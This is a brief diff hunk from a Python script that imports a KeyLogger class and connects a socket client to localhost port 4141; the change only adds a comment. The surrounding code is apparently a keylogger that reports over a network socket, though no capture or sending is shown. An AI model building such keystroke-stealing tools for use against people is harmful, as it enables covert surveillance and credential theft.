@@ -11,6 +11,7 @@ from keylogger import KeyLogger
 ip = '127.0.0.1'
 port = 4141
 
+#create a socket with our given IP and port, attempt a connection.
 client = socket.socket()
 client.connect((ip, port))
 print("connected")
